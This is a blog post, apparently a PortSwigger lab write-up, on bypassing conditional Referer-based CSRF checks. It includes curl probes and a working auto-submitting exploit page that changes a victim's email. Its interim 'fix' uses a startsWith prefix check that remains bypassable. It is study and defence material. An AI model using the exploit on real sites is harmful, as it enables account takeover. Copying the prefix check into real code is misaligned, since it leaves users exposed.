---
layout: post
title: "PortSwigger: CSRF Referer Validation Depends on Header Being Present"
date: 2027-07-18 09:00:00 -0500
categories: [Web Security, CSRF]
tags: [portswigger, csrf, referer, header-bypass, web]
---

## Lab Summary

**Lab:** CSRF where Referer validation depends on header being present  
**Difficulty:** Practitioner  
**CWE:** [CWE-352](https://cwe.mitre.org/data/definitions/352.html) – Cross-Site Request Forgery  
**Result:** Solved

---

## The Vulnerability

The app tries to defend against [cross-site request forgery](https://cwe.mitre.org/data/definitions/352.html) by checking the `Referer` header — but only when the header is actually present. The broken validation looks like this:

```js
if (req.headers.referer && !req.headers.referer.startsWith('https://TARGET')) {
  return res.status(400).send('Invalid Referer');
}
// no Referer = no check = request accepted
db.updateEmail(req.session.userId, req.body.email);
```

This is a **conditional** check, not a mandatory one. If `Referer` is present and wrong → 400. If `Referer` is absent → the `if` branch is never entered and the request succeeds.

There is also no CSRF token on the email-change form — the `Referer` check is the sole defence.

---

## Why It Works

Browsers include the `Referer` header on cross-origin requests by default, but **the client controls this**. The HTML meta referrer policy `<meta name="referrer" content="no-referrer">` instructs the browser to suppress `Referer` on all navigations that originate from the page.

A cross-origin CSRF form submission from an exploit page carrying that meta tag arrives at the server with **no `Referer` header at all** — which the broken validation treats as implicitly trusted, skipping the check entirely.

---

## Solution

**Step 1 — Probe the endpoint** (two requests confirm the conditional logic):

```bash
# Wrong Referer → 400 (validation exists but is Referer-dependent)
curl -sk -b cookies.txt -X POST 'https://TARGET/my-account/change-email' \
  -H 'Referer: https://evil.com/' \
  -d 'email=probe@evil.com' -o /dev/null -w '%{http_code}'
# → 400

# No Referer at all → 302 (bypass confirmed)
curl -sk -b cookies.txt -X POST 'https://TARGET/my-account/change-email' \
  -d 'email=probe@evil.com' -o /dev/null -w '%{http_code}'
# → 302
```

A 302 with no `Referer` header confirms the server only validates when the header is present.

**Step 2 — Build the exploit page** and host it on the exploit server:

```html
<html>
<head>
  <meta name="referrer" content="no-referrer">
</head>
<body>
  <form action="https://TARGET/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pwned@attacker.com">
  </form>
  <script>document.forms[0].submit();</script>
</body>
</html>
```

The `<meta name="referrer" content="no-referrer">` tag suppresses the `Referer` header on the auto-submitted form. The victim's session cookie is still attached by the browser (standard cross-origin behaviour), so the server processes the request as if it were legitimate.

**Step 3 — Deliver to victim.**

The victim's browser loads the exploit page, `document.forms[0].submit()` fires automatically, and the email change goes through — without the server ever seeing a `Referer` header to validate.

---

## Why It Worked

The server implements a guard that reads: *"if Referer exists AND is wrong, reject."* The implicit third case — *Referer absent* — falls through to the happy path. Developers who add Referer validation often forget that clients can suppress the header entirely, and that an absent header must be treated as untrusted rather than skipped.

---

## Fix / Defense

**Make the check mandatory** — treat a missing `Referer` as untrusted:

```js
const ref = req.headers.referer || '';
if (!ref.startsWith('https://TARGET')) {
  return res.status(400).send('CSRF check failed');
}
```

**Better: use a synchronizer CSRF token.** Headers can always be suppressed by the client; a per-session, per-request opaque token embedded in the form cannot:

```js
if (!req.body.csrf || req.body.csrf !== req.session.csrfToken) {
  return res.status(403).send('CSRF token required');
}
```

The `Origin` header is also worth validating as defence-in-depth — it is present on all cross-origin `POST` requests and is harder to suppress than `Referer`.
